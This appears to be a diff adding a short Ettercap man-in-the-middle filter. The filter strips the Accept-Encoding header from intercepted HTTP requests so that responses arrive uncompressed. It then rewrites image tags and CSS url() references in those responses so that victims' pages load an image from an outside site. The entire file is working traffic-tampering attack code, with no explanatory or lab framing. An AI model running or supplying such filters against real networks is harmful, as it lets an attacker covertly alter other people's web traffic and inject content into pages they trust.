@@ -1,0 +1,13 @@
+if (ip.proto == TCP && tcp.dst == 80) {
+   if (search(DATA.data, "Accept-Encoding")) {
+    # note: replacement string is same length as original string
+     replace("Accept-Encoding", "Accept-SECURITY");
+     msg("Filter run!...Remove Accept-Encoding in http request header!\n");
+   }
+}
+if (ip.proto == TCP && tcp.src == 80) {
+  replace("url(", "url(); nouse(");
+  replace("img src=", "img src=\"https://huangwei.me/about.png\" ");
+  replace("IMG SRC=", "img src=\"https://huangwei.me/about.png\" ");
+  msg("Filter run!...image url replaced!\n");
+}
